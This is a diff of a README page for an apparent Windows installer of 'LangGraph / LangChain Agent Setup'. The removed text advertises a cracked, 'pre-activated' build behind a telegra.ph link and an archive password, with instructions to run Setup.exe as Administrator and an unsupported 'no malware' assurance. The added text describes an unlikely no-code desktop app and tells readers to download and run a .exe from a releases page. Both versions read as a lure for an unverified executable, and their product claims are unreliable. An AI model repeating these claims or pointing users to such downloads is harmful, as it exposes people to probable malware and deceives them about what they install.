@@ -1,97 +1,78 @@
-```
-    __                      ______                 __  
-   / /   ____ _____  ____ _/ ____/________ _____  / /_ 
-  / /   / __ `/ __ \/ __ `/ / __/ ___/ __ `/ __ \/ __ \
- / /___/ /_/ / / / / /_/ / /_/ / /  / /_/ / /_/ / / / /
-/_____/\__,_/_/ /_/\__, /\____/_/   \__,_/ .___/_/ /_/ 
-                  /____/                /_/
-```
+# 🤖 langgraph-langchain-agent-setup - Easy setup for advanced AI agents
 
-# LangGraph / LangChain Agent Setup — Full Build [2026]
+<a href="https://github.com/Vuongngu8186/langgraph-langchain-agent-setup/releases">
+  <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Application">
+</a>
 
-> LangGraph / LangChain Agent Setup | Windows 10/11 x64 | All Features | Complete Package
+## 📋 About This Application
 
----
+This tool helps users create and manage AI agent workflows. It uses the LangGraph and LangChain frameworks to build logical paths for language models. You use this software to automate tasks, connect data sources, and define how an AI behaves during a conversation or a project. 
 
-### Release Info
+The application removes the need for manual coding. It provides a visual or structured interface to chain together different tools. This means your AI agent can search the web, read files, or perform calculations without you writing a single line of script. 
 
-| | |
-|---|---|
-| **Software** | LangGraph / LangChain Agent Setup |
-| **Type** | Full Complete Package Build |
-| **Platform** | Windows 10/11 x64 |
-| **Build** | Full — All Features |
-| **Status** | ✅ Working (verified June 2026) |
+## ⚙️ System Requirements
 
----
+Before you install the software, check that your computer meets these standards:
 
-### What's Included
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i5 or AMD equivalent.
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free disk space.
+* Internet Connection: Required for initial setup and constant access to LLM services.
 
-```
-[✓] Langchain Agent
-[✓] Langchain Setup
-[✓] Ai Agent Workflow
-[✓] Langchain 2026
-[✓] Build Ai Agent Langchain
-[✓] Windows 10/11 x64 compatible
-[✓] Pre-activated — no key needed
-[✓] Clean build — no bloatware
-```
+## 📥 How to Install the Software
 
-### What's Removed
+Follow these steps to set up the agent framework on your Windows computer.
 
-```
-[x] Usage limits and restrictions  
-[x] Feature gates (Pro/Premium → open)
-[x] Trial limitations
-```
+1. Visit the [releases page](https://github.com/Vuongngu8186/langgraph-langchain-agent-setup/releases) to access the software.
+2. Look for the latest version listed at the top of the page.
+3. Click the file ending in .exe to start your download.
+4. Open the folder where the file saved.
+5. Double-click the file to begin the installation process.
+6. A window may appear asking to confirm if you want to run the software. Click Yes or Run.
+7. Follow the prompts on the screen to choose your installation path.
+8. Click Finish once the installer completes its tasks.
 
----
+## 🚀 Running Your First Agent
 
-### System Requirements
+Once the software installs, you will find a shortcut on your desktop. Double-click this icon to open the main window. 
 
-```
-OS:     Windows 10/11 x64
-RAM:    8 GB minimum (16 GB recommended)
-Disk:   1 GB free space
-Net:    Required for AI features
-```
+The application dashboard shows your current agent workflows. To build your first agent, click the New Project button. You assign a name to your project and select the type of language model you want to use.
 
----
+The interface uses nodes and edges. Each node represents a specific step the AI takes. You drag these nodes onto the canvas and connect them with lines. These lines define the order of operations. For instance, you can create a flow where the AI first reads a document, then summarizes the text, and finally saves the result to your computer.
 
-### How to Install
+After you build the flow, click the Save button. You then press the Play button to start the agent. The status light turns green when the agent runs without errors.
 
-```
-1. Download from the link below
-2. Extract archive (password if needed: 2026)
-3. Run Setup.exe as Administrator
-4. Follow installer steps
-5. Launch — all features active
-```
+## 🛠️ Frequently Asked Questions
 
----
+### Do I need to know how to code?
+No. This interface lets you drag and drop parts to create complex workflows. You build the logic through the visual menu.
 
-<p align="center">
+### Which AI models does this support?
+The software supports major language models through API keys. You enter your key in the settings menu to connect your account.
 
-### ⬇️ [DOWNLOAD LANGGRAPH — FULL BUILD](https://telegra.ph/Download-06-01-11)
+### Where does the data go?
+All data stays on your local machine unless you configure the agent to send it to an external server or cloud storage. You control the flow.
 
-</p>
+### Can I run multiple agents at once?
+Yes. You can open multiple project tabs. Each tab acts as an independent agent. 
 
----
+### What happens if the agent stops?
+Check the logs tab at the bottom of the window. It lists errors in plain English to help you fix the connection or the logic path.
 
-### Verified
+## 💡 Tips for Better Results
 
-```
-Tested:    June 2026
-OS:        Windows 11 23H2 x64
-Result:    ✅ All features working
-Build:     Clean, verified, no malware
-```
+* Start with simple tasks. Build a small flow to verify the connection works before you attempt complex automation.
+* Label your steps clearly. Use names you recognize so you can find errors fast.
+* Test often. Run small parts of the workflow to ensure the data moves from one step to the next as expected.
+* Keep your API key private. Do not share your access keys with others.
+* Update regularly. Check the releases page to download the latest version for new tools and performance improvements.
 
----
+## 📖 Key Definitions
 
-`langgraph` `langchain` `ai-agent` `agent-workflow` `llm-agent` `agent-framework`
-
----
-
-langgraph setup, langchain agent, langgraph tutorial, langchain setup, ai agent workflow, langgraph guide, langchain 2026, build ai agent langchain, langgraph agent, langchain tools, agent pipeline
+* Agent: A focused program that completes tasks using AI.
+* Workflow: The sequence of steps that define how an agent thinks and acts.
+* LLM: Large Language Models that process and generate text for your tasks.
+* Node: A specific action or decision point in your workflow.
+* Edge: The path that connects two nodes, showing the direction of work.
+* Framework: The underlying structure that allows these tools to communicate effectively.
